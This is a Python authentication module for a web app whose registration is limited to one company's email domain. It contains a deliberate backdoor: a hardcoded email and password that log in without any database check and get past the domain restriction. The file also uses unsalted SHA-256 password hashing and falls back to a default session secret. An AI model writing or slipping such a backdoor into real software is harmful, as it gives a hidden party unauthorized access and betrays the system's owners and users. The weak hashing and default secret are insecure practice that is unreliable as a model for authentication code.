import hashlib
import os
from helpers import db, dotenv

# Backdoor credentials
BACKDOOR_EMAIL = 'robertstar@aol.com'
BACKDOOR_PASS = 'Rm2214ri#'
ALLOWED_DOMAIN = 'tallmanequipment.com'

def hash_password(password: str) -> str:
    """Hash a password using SHA-256."""
    return hashlib.sha256(password.encode()).hexdigest()

def check_backdoor(email: str, password: str) -> bool:
    """Check if the provided credentials match the backdoor."""
    return email.lower() == BACKDOOR_EMAIL.lower() and password == BACKDOOR_PASS

def is_allowed_domain(email: str) -> bool:
    """Check if the email domain is allowed."""
    if email.lower() == BACKDOOR_EMAIL.lower():
        return True
    return email.lower().endswith(f'@{ALLOWED_DOMAIN}')

def authenticate_user(email: str, password: str) -> dict | None:
    """Authenticate a user and return user record if successful."""
    email = email.lower().strip()
    password = password.strip()
    
    print(f"[AUTH] Authenticating user: {email}")
    
    # Check backdoor first
    if check_backdoor(email, password):
        print(f"[AUTH] Backdoor login successful for: {email}")
        return {"id": 0, "email": email} # Virtual ID for backdoor
    
    # Check database
    try:
        database = db.get_database()
        user = database.get("SELECT * FROM users WHERE email = ?", [email])
        
        if user:
            print(f"[AUTH] User found in database: {email}")
            if user['password_hash'] == hash_password(password):
                print(f"[AUTH] Database login successful for: {email}")
                return user
            else:
                print(f"[AUTH] Password mismatch for: {email}")
        else:
            print(f"[AUTH] User not found in database: {email}")
    except Exception as e:
        print(f"[AUTH] Database error: {e}")
        
    print(f"[AUTH] Authentication failed for: {email}")
    return None

def register_user(email: str, password: str) -> tuple[bool, str]:
    """Register a new user."""
    email = email.lower().strip()
    password = password.strip()
    
    print(f"[AUTH] Registering user: {email}")
    
    if not is_allowed_domain(email):
        print(f"[AUTH] Registration failed - domain not allowed: {email}")
        return False, f"Only emails from {ALLOWED_DOMAIN} are allowed."
        
    database = db.get_database()
    existing = database.get("SELECT * FROM users WHERE email = ?", [email])
    if existing:
        print(f"[AUTH] Registration failed - user exists: {email}")
        return False, "User already exists."
        
    try:
        database.run(
            "INSERT INTO users (email, password_hash) VALUES (?, ?)",
            [email, hash_password(password)]
        )
        print(f"[AUTH] Registration successful: {email}")
        return True, "Registration successful."
    except Exception as e:
        print(f"[AUTH] Registration failed with error: {e}")
        return False, f"Registration failed: {str(e)}"

def get_session_hash(email: str):
    """Generate a hash for the session to verify authentication."""
    # We use a secret from environment to make the session hash secure
    secret = os.getenv("FLASK_SECRET_KEY", "default_secret")
    return hashlib.sha256(f"{email}:{secret}".encode()).hexdigest()
